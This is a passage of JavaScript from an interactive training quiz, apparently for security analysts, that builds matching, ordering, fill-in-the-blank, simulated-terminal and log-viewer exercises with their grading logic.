    var H=0,W=0,items=[],N=0;
    cfg.chips.forEach(function(ch){
      var got = placed[ch.id];
      var want = cfg.correct[ch.id];
      var why = (cfg.chipWhy&&cfg.chipWhy[ch.id])||'';
      if(want){
        /* scored item: a chip with a correct home */
        N++;
        if(!got){ items.push({s:'miss', label:ch.t, why:why}); }
        else if(got===want){ H++; items.push({s:'ok', label:ch.t, why:why}); }
        else { W++; items.push({s:'bad', label:ch.t+' → placed in “'+(cfg.zoneName?cfg.zoneName[got]||got:got)+'”', why:why}); }
      } else if(got){
        /* distractor chip with no home: placing it anywhere is a wrong item */
        W++;
        items.push({s:'bad', label:ch.t+' → does not belong in any box', why:why||'This chip is a distractor — it is not part of the correct answer.'});
      }
    });
    if(N===0){ N=1; }
    return {H:H,W:W,N:N,items:items,expl:ex.expl};
  };
}
function buildMatch(w){
  var ex = w.ex;
  var chips = ex.right.map(function(r,i){ return {id:'r'+i, t:r, code:!!ex.code}; });
  var zones = ex.left.map(function(l,i){ return {id:'l'+i, label:l}; });
  /* chip-keyed map: chip rX belongs in zone lY  (grade looks up by chip id) */
  var correct = {}; ex.left.forEach(function(_,i){ correct['r'+ex.correct[i]] = 'l'+i; });
  var zoneName = {}; zones.forEach(function(z){ zoneName[z.id]=z.label; });
  chipSlotWidget(w, {zones:zones, chips:chips, correct:correct, chipWhy:ex.chipWhy, help:ex.help, zoneName:zoneName});
}
function buildDnd(w){
  var ex = w.ex;
  var zoneName = {}; ex.zones.forEach(function(z){ zoneName[z.id]=z.label; });
  chipSlotWidget(w, {zones:ex.zones, chips:ex.chips, correct:ex.correct, chipWhy:ex.chipWhy, help:ex.help, zoneName:zoneName});
}

/* ---------- order / rank ---------- */
function buildOrderW(w){
  var ex = w.ex, host = w.host;
  var ctx = ex.rankNote ? '<p class="small">'+esc(ex.rankNote)+'</p>' : '';
  if(!ex._shuf){ ex._shuf = shuffle(ex.correct.map(function(_,i){return i;})); }
  host.insertAdjacentHTML('afterbegin', ctx+'<div class="olist" id="olist"></div>');
  var list = host.querySelector('#olist');
  function bindAll(){
    Array.prototype.forEach.call(list.querySelectorAll('[data-mv]'), function(b){
      b.addEventListener('click', function(ev){
        ev.stopPropagation();
        var p = parseInt(b.getAttribute('data-p'),10);
        move(p, b.getAttribute('data-mv')==='up'? p-1 : p+1);
      });
    });
    Array.prototype.forEach.call(list.querySelectorAll('.oitem'), function(it){
      it.addEventListener('dragover', function(ev){ ev.preventDefault(); });
      it.addEventListener('drop', function(ev){
        ev.preventDefault();
        var from = parseInt(ev.dataTransfer.getData('text/plain'),10);
        var to = parseInt(it.getAttribute('data-p'),10);
        if(!isNaN(from)){ move(from,to); }
      });
    });
  }
  function render(){
    list.innerHTML='';
    ex._shuf.forEach(function(itemIdx,pos){
      var d = document.createElement('div');
      d.className='oitem'; d.draggable=true; d.setAttribute('data-p',String(pos));
      d.innerHTML = '<span class="pos">'+(pos+1)+'</span><span style="flex:1">'+esc(ex.correct[itemIdx])+'</span>'+
        '<span class="obtns"><button type="button" aria-label="move up" data-mv="up" data-p="'+pos+'">▲</button>'+
        '<button type="button" aria-label="move down" data-mv="dn" data-p="'+pos+'">▼</button></span>';
      d.addEventListener('dragstart', function(ev){ try{ ev.dataTransfer.setData('text/plain', String(pos)); }catch(e){} d.classList.add('dragging'); });
      d.addEventListener('dragend', function(){ d.classList.remove('dragging'); });
      list.appendChild(d);
    });
    bindAll();
  }
  function move(from,to){
    if(from<0||to<0||from>=ex._shuf.length||to>=ex._shuf.length){ return; }
    var t = ex._shuf[from]; ex._shuf[from]=ex._shuf[to]; ex._shuf[to]=t; render();
  }
  render();
  w._grade = function(){
    var H=0,W=0,items=[];
    ex.correct.forEach(function(_,pos){
      var gotIdx = ex._shuf[pos];
      var ok = gotIdx===pos;
      if(ok){ H++; items.push({s:'ok', label:'Position '+(pos+1)+': '+clip(ex.correct[pos],70), why:ex.itemWhy?ex.itemWhy[pos]:''}); }
      else { W++; items.push({s:'bad', label:'Position '+(pos+1)+': you placed “'+clip(ex.correct[gotIdx],60)+'” — expected “'+clip(ex.correct[pos],60)+'”', why:ex.itemWhy?ex.itemWhy[pos]:''}); }
    });
    return {H:H,W:W,N:ex.correct.length,items:items,expl:ex.expl};
  };
}

/* ---------- select-blank report drafting ---------- */
function buildSelblank(w){
  var ex = w.ex, host = w.host;
  var h = '<div class="prose">';
  ex.parts.forEach(function(p){
    if(typeof p==='string'){ h += fmtText(p); }
    else { h += '<select data-b="'+p.b+'" aria-label="blank '+(p.b+1)+'" style="min-height:44px;background:#0f1826;color:#e6edf7;border:1.5px solid var(--blue);border-radius:8px;padding:6px 8px;font-size:.92rem;max-width:260px"></select>'; }
  });
  h += '</div>';
  host.insertAdjacentHTML('afterbegin', h);
  ex.parts.forEach(function(p){
    if(typeof p==='string'){ return; }
    var sel = host.querySelector('select[data-b="'+p.b+'"]');
    var opts = shuffle(p.o.map(function(_,i){return i;}));
    sel.insertAdjacentHTML('beforeend','<option value="">— choose —</option>');
    opts.forEach(function(oi){ sel.insertAdjacentHTML('beforeend','<option value="'+oi+'">'+esc(p.o[oi])+'</option>'); });
  });
  w._grade = function(){
    var H=0,W=0,items=[];
    ex.blanks.forEach(function(bi){
      var sel = host.querySelector('select[data-b="'+bi+'"]');
      var v = sel ? sel.value : '';
      if(v===''){ items.push({s:'miss', label:'Blank '+(bi+1)+' (left empty)', why:'Correct: “'+ex.optsFor[bi][ex.correct[bi]]+'”. '+ex.why[bi]}); }
      else if(parseInt(v,10)===ex.correct[bi]){ H++; items.push({s:'ok', label:'Blank '+(bi+1)+': '+ex.optsFor[bi][ex.correct[bi]], why:ex.why[bi]}); }
      else { W++; items.push({s:'bad', label:'Blank '+(bi+1)+': '+ex.optsFor[bi][parseInt(v,10)], why:'Correct: “'+ex.optsFor[bi][ex.correct[bi]]+'”. '+ex.why[bi]}); }
    });
    return {H:H,W:W,N:ex.blanks.length,items:items,expl:ex.expl};
  };
}

/* ---------- terminal ---------- */
function normCmd(s){
  return String(s||'').trim().replace(/\s+/g,' ').toLowerCase();
}
function buildTerminal(w){
  var ex = w.ex, host = w.host, T = ex.terminal;
  if(!ex._timerInit){ ex._timerInit = true; exTimerLeft = T.timerSec||0; }
  var h = '';
  if(T.outshape){
    h += '<div class="synpanel"><h4>EXPECTED OUTPUT SHAPE</h4><div class="mono">'+esc(T.outshape)+'</div></div>';
  }
  if(T.syntax){
    h += '<div class="synpanel"><h4>SYNTAX REMINDER</h4>';
    h += '<p style="margin:.2rem 0">'+fmtText(T.syntax.shape)+'</p>';
    if(T.syntax.example){ h += '<p style="margin:.2rem 0">Example on a <b>different</b> target: <code class="inline-code">'+esc(T.syntax.example)+'</code></p>'; }
    if(T.syntax.flags && T.syntax.flags.length){ h += '<ul class="small" style="margin:.3rem 0 0 1.2rem">'; T.syntax.flags.forEach(function(f){ h+='<li>'+fmtText(f)+'</li>'; }); h+='</ul>'; }
    h += '</div>';
  }
  h += '<div class="term"><div class="term-h"><span>🖥 '+esc(T.termTitle||'simulation only — nothing real is executed')+'</span><span>'+esc(T.user||'analyst')+'</span></div>'+
       '<div class="term-out" id="tout"></div>'+
       '<div class="term-in"><span class="ps">'+esc(T.prompt||'$')+'</span><input id="tin" type="text" autocomplete="off" spellcheck="false" aria-label="type your command and press Enter"></div></div>';
  host.insertAdjacentHTML('afterbegin', h);
  var out = host.querySelector('#tout'), inp = host.querySelector('#tin');
  var lastCmd = '';
  (T.welcome||[]).forEach(function(l){
    var d=document.createElement('div'); d.textContent=l; out.appendChild(d);
  });
  function run(cmdRaw){
    var d1=document.createElement('div'); d1.textContent=(T.prompt||'$')+' '+cmdRaw; out.appendChild(d1);
    var cmd = normCmd(cmdRaw);
    lastCmd = cmd;
    var first = cmd.split(' ')[0];
    if(cmd===''){ /* nothing typed */ }
    else if(T.tools.indexOf(first)<0){
      var d2=document.createElement('div'); d2.textContent = (first? first+': ' : '')+'command not found';
      d2.style.color='#f0a8a4'; out.appendChild(d2);
    } else {
      var matched = null;
      (T.outsim||[]).some(function(os){ if(os.re && new RegExp(os.re,'i').test(cmd)){ matched = os; return true; } return false; });
      var lines = matched ? matched.out : (T.defaultOut||['(the command runs)']);
      lines.forEach(function(l){ var d3=document.createElement('div'); d3.textContent=l; out.appendChild(d3); });
    }
    out.scrollTop = out.scrollHeight;
  }
  inp.addEventListener('keydown', function(ev){
    if(ev.key==='Enter'){ var v=inp.value; inp.value=''; run(v); }
  });
  w._grade = function(){
    var cmd = lastCmd;
    var H=0,W=0,items=[];
    (T.elements||[]).forEach(function(el){
      var ok = new RegExp(el.re,'i').test(cmd);
      if(ok){ H++; items.push({s:'ok', label:el.label, why:el.why}); }
      else { items.push({s:'miss', label:el.label, why:el.why}); }
    });
    (T.bad||[]).forEach(function(bd){
      if(new RegExp(bd.re,'i').test(cmd)){ W++; items.push({s:'bad', label:bd.label, why:bd.why}); }
    });
    return {H:H,W:W,N:(T.elements||[]).length,items:items,expl:ex.expl};
  };
}

/* ---------- log viewer ---------- */
function buildLogview(w){
  var ex = w.ex, host = w.host, L = ex.logview;
  var h = '<div class="logbar"><input id="lf" type="text" placeholder="filter… (case-insensitive)" aria-label="filter log lines">'+
          '<span class="cnt" id="lcnt"></span></div><div class="lg" id="lg"></div>';
  host.insertAdjacentHTML('afterbegin', h);
  var lg = host.querySelector('#lg'), lf = host.querySelector('#lf'), cnt = host.querySelector('#lcnt');
  var sel = {};
  function render(filter){
    lg.innerHTML='';
    var shown=0;
    L.lines.forEach(function(line, i){
      if(filter && line.toLowerCase().indexOf(filter.toLowerCase())<0){ return; }
      shown++;
      var b = document.createElement('button');
      b.type='button'; b.className='lg-line'; b.setAttribute('data-i',String(i));
      b.textContent = line;
